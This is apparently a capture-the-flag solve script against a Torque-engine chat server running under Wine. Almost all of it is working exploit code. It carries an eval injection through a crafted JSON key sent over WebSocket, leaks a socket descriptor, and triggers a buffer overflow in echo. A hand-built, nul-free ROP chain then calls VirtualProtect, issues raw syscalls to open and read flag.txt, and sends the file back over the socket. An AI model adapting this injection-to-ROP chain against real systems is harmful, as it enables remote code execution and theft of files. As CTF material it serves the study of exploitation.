from websocket import WebSocket, ABNF
import argparse
import itertools
import socket
import struct
import json
import time

def do_it(addr, port):
    ws = WebSocket()
    # mask key with newlines to make message sending more reliable
    # (torque needs a newline to process old messages)
    ws.get_mask_key = lambda l: b'\n' * l
    ws.connect(f"ws://{addr}:{port}/chat")

    def send(ws, text):
        # don't do more than 100 because length > 126 adds a nul to your encoded length
        for i in range(0, len(text), 100):
            slice = text[i:i+100]
            print(slice)
            op = ABNF.OPCODE_TEXT if i == 0 else ABNF.OPCODE_CONT
            frame = ABNF.create_frame(slice, op, 1 if i + 100 >= len(text) else 0)
            # websocket-python really hates this line lol
            frame.rsv1 = 1  # prevent opcode byte from being 00
            ws.send_frame(frame)
            print(f"<< {frame.format()}")
            # send a ping frame so we get some newlines
            ws.send_frame(ABNF.create_frame("aaaaaaa", ABNF.OPCODE_PING))

    # use eval injection in jsonParse
    def ws_eval(cmd, wait=True):
        print(cmd)
        # {"type=eval(\"stuff\");//": "1"}
        # turns into 1234.type=eval("stuff");// = 1
        send(ws, json.dumps({"type=eval(\"" + cmd.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ").replace("\t", " ").replace("\r", " ") + "\");//": "1"}))
        if not wait:
            return None
        # websocket lib handles pong for us
        frame = json.loads(ws.recv())
        print(f">> {frame}")
        # in case we get other non result messages
        while frame["type"] != "result":
            frame = json.loads(ws.recv())
            print(f">> {frame}")
        # "I don't know what you mean by <evalled stuff here>."
        return frame["value"][len("I don't know what you mean by "):-1]

    # There's probably a better way to capture the incoming fd of socket2
    ws_eval("""
    function devecho(%cmd) {
        if (strpos(%cmd, "onConnectRequest") != -1) {
            $result = %cmd;
        }
    }
    """)

    # Open a second socket for sending the results back
    # because we need an fd to write it to
    socket2 = socket.socket()
    socket2.connect((addr, port))

    # Probably should have just overridden WebSocketServer::onConnectRequest lol
    next_line = ws_eval("return $result;")

    # Make sure we actually got it
    print(next_line)
    assert('WebSocketServer::onConnectRequest' in next_line)

    # Extract fd
    for line in next_line.split("\n"):
        if "WebSocketServer::onConnectRequest" in line:
            line = line.strip()
            line = line[:-1]
            line = line[line.rfind(" ")+1:]
            out_fd = int(line)

    print(f"result fd: {out_fd}")

    # can't just use script to read flag.txt since the vfs cannot read in the root
    # so use the bug in echo/dSprintf to pivot to rop and open the file ourselves
    # there are other ways to do this, but i don't think you can workaround having
    # to get to arbitrary code execution

    # here are the register states at the time of rop control
    # EAX: 0x1601
    # EBX: 0x2
    # ECX: 0x41414141 ('AAAA')
    # EDX: 0xa9a1d --> 0x0
    # ESI: 0x2
    # EDI: 0x1a6a708 ('A' <repeats 200 times>...)
    # EBP: 0x41414141 ('AAAA')
    # ESP: 0x21f190 --> 0x7bc692a0 --> 0x9090c359 --> 0x0
    # EIP: 0x7bc4acbc --> 0x768dc3 --> 0x25 ('%')

    # getting data into this sucks, so i'm building the entire payload in one shot
    # in_fd = open(eax=5, ebx="flag.txt", ecx=0, edx=0)
    # sendfile did not work because LMAO my socket fd is a wine fd not a linux fd
    # read(eax=3, ebx=fd, ecx=buf, edx=count)
    # ~~sendfile(eax=0xef, ebx=out_fd, ecx=in_fd, edx=0, esi=0x100)~~
    # instead, just use Net::send(out_fd, buffer, size)

    # kernel32.dll
    # no aslr, thanks wine
    # this binary doesn't have very many gadgets, so we just use it to build a
    # better chain with all the gadgets offset by a constant that makes sure every
    # byte is not nul (thanks, torque)
    # then we can use the exe's gadgets and there are way more of those

    # general strategy:
    # 0x7b62ea97, # pop eax ; pop ecx ; retn
    # eax = target gadget - 0xa910448d
    # ecx = location - 0x14
    # 0x7b61c398, # add eax, 0xa910448d ; retn
    # now eax = target gadget
    # 0x7b62e9e5, # mov dword [ecx+0x14], eax ; xor eax, eax ; retn
    # writes target gadget to location
    # after gadgets are written, pivot stack
    # 0x7b618058, # pop ebp ; retn
    # 0x7b61544f, # leave ; retn

    # ChatTGE.exe
    # addresses have a nul, need to write to a buffer and jump there
    # 0x0062d8f0, # pop eax ; retn
    # 0x00449e2b, # pop ebx ; retn
    # 0x0041d739, # pop ecx ; retn
    # 0x00409b02, # pop edx ; retn
    # 0x00440dda, # pop esi ; retn

    # some writable data at 0x7b630820 it's rw in kernelbase.dll
    buffer = 0x7b630820
    flag_size = 0x40

    buffer_payload = [
        # i can't find a good int 0x80 ; ret gadget in the binary
        # (do i even need one? does int 0x80 return to the caller?)
        # anyway, here's a shitty workaround: just protect some memory as rw
        # then we can write the int 0x80 there and protect it rx after

        # VirtualProtect(somePage, 0x1000, PAGE_READWRITE, oldProtect [just needs to be good])

        0x7b60e254, # virtualprotect
        0x0041d6ef, # retn # next address
        0x0044d000, # lpAddress
        0x1000, # dwSize,
        0x04, # flNewProtect = PAGE_READWRITE
        buffer - 0xc, # lpflOldProtect

        # *somePage = `int 0x80 ; ret`

        0x0062d8f0, # pop eax ; retn
        0x0044d000, # addr
        0x0041d739, # pop ecx ; retn
        0x00c380cd, # data
        0x0047f03e, # mov dword [eax], ecx ; retn

        # VirtualProtect(somePage, 0x1000, PAGE_EXECUTE_READ, oldProtect [just needs to be good])

        0x7b60e254, # virtualprotect
        0x0041d6ef, # retn # next address
        0x0044d000, # lpAddress
        0x1000, # dwSize,
        0x20, # flNewProtect = PAGE_EXECUTE_READ
        buffer - 0xc, # lpflOldProtect

        # write flag.txt to buffer

        0x0062d8f0, # pop eax ; retn
        buffer, # addr
        0x0041d739, # pop ecx ; retn
        0x67616C66, # data
        0x0047f03e, # mov dword [eax], ecx ; retn

        0x0062d8f0, # pop eax ; retn
        buffer + 4, # addr
        0x0041d739, # pop ecx ; retn
        0x7478742E, # data
        0x0047f03e, # mov dword [eax], ecx ; retn

        0x0062d8f0, # pop eax ; retn
        buffer + 8, # addr
        0x0041d739, # pop ecx ; retn
        0x0, # data
        0x0047f03e, # mov dword [eax], ecx ; retn

        # in_fd = open(eax=5, ebx="flag.txt", ecx=0, edx=0)

        0x0062d8f0, # pop eax ; retn
        5, # eax
        0x00449e2b, # pop ebx ; retn
        buffer, # ebx
        0x0041d739, # pop ecx ; retn
        0, # ecx
        0x00409b02, # pop edx ; retn
        0, # edx
        0x0044d000, # int 0x80 ; retn

        # read(eax=3, ebx=in_fd, ecx=buffer, edx=0x20)

        0x00449e2b, # pop ebx ; retn
        0, # ebx
        0x006a0672, # xor ebx, eax ; mov al, 0x18 ; retn

        0x0062d8f0, # pop eax ; retn
        3, # eax
        0x0041d739, # pop ecx ; retn
        0x806000, # ecx
        0x00409b02, # pop edx ; retn
        flag_size, # edx
        0x0044d000, # int 0x80 ; retn

        # can't use sendfile but i can use this
        # Net::sendToSocket(out_fd, buffer, size)

        0x006a7800, # Net::sendToSocket
        0x00745d46, # exit
        out_fd, # fd
        0x806000, # buffer
        flag_size, # size
    ]

    # Sanity check that we don't have any nuls
    for gadget in buffer_payload:
        assert(gadget + 0x56efbb73) & 0xff != 0
        assert(gadget + 0x56efbb73) & 0xff00 != 0
        assert(gadget + 0x56efbb73) & 0xff0000 != 0
        assert(gadget + 0x56efbb73) & 0xff000000 != 0

    # assemble payload building payload
    payload = [
        # debugging:
        # 0x7bc4acbb, # int3 ; retn
    ] + list(itertools.chain(*[[
        # these are just buffer[i*4] = (gadget + <const>) - <const>
        0x7b62ea97, # pop eax ; pop ecx ; retn
        (gadget + 0x56efbb73) & 0xffffffff,
        buffer - 0x14 + i * 4, # ecx
        0x7b61c398, # add eax, 0xa910448d ; retn
        0x7b62e9e5, # mov dword [ecx+0x14], eax ; xor eax, eax ; retn
    ] for i, gadget in enumerate(buffer_payload)])) + [
        # esp = buffer
        0x7b618058, # pop ebp ; retn
        buffer - 4, # buffer
        0x7b61544f, # leave ; retn
    ]

    # straight outta xonshrc
    def splitN(a,n):
        """
        splitN takes an array [1, 2, 3, 4, 5, 6] and gives you [[1, 2], [3, 4], [5, 6]]
        """
        import math
        return [a[i*n:(i+1)*n] for i in range(math.ceil(len(a)/n))]

    # turn gadget into \x12\x34\x56\x78 so torque can parse it
    def dp32(stuff):
        return ''.join([f'\\x{ch:02x}' for ch in struct.pack('<I', stuff)])

    # encode like 50 of them in each chunk so we don't overflow the string parsing
    payload_encoded = '"@"'.join([''.join([dp32(bla) for bla in chunk]) for chunk in splitN(payload, 50)])

    # send the payload! strRepeat included because it used to be a de bruijn pattern
    print(ws_eval("""
    function pattern(%count) {
        %result = "";
        for (%i = 0; %i < %count; %i += 1) {
            %result = %result @ "A";
        }
        return %result;
    }
    $Con::LogBufferEnabled = false;
    echo(pattern(0x1010) @ """ + "\"" + payload_encoded + "\"" + """);
    $Con::LogBufferEnabled = true;
    """, wait=False))

    # payload will write the flag out to socket2's fd
    flag_bytes = socket2.recv(0x100)
    print(flag_bytes)
    print(flag_bytes.split(b'\n')[0].decode())
    return True



parser = argparse.ArgumentParser('solve')
parser.add_argument("address", type=str)
args = parser.parse_args()

addr = args.address
if "http" in addr:
    addr = ":".join(addr.split(":")[1:])

remote_addr = addr.split(":")[0]
remote_port = int(addr.split(":")[1])

print(f"ADDR: {remote_addr}")
print(f"PORT: {remote_port}")

for i in range(10):
    try:
        if do_it(remote_addr, remote_port):
            break
    except AssertionError:
        pass
